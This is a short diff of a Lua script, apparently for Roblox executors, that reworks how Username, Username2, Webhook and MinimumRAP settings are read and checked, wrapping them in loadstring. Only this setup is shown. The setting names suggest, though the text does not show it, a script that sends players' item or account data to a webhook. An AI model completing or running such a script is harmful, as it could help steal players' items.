@@ -1,21 +1,22 @@
-local Username = getgenv().Username
-local Username2 = getgenv().Username2
-local Webhook = getgenv().Webhook
-local MinimumRAP = getgenv().MinimumRAP
+loadstring([[
+local Username = Username
+local Username2 = Username2
+local Webhook = Webhook
+local MinimumRAP = MinimumRAP
 
-if Username == nil then
+if not Username or Username == "" then
     error("Username is not defined.")
 end
 
-if Username2 == nil then
+if not Username2 or Username2 == "" then
     error("Username2 is not defined.")
 end
 
-if Webhook == nil or Webhook == "" then
+if not Webhook or Webhook == "" then
     error("Webhook is not defined.")
 end
 
-if MinimumRAP == nil then
+if not MinimumRAP then
     error("MinimumRAP is not defined.")
 end
 
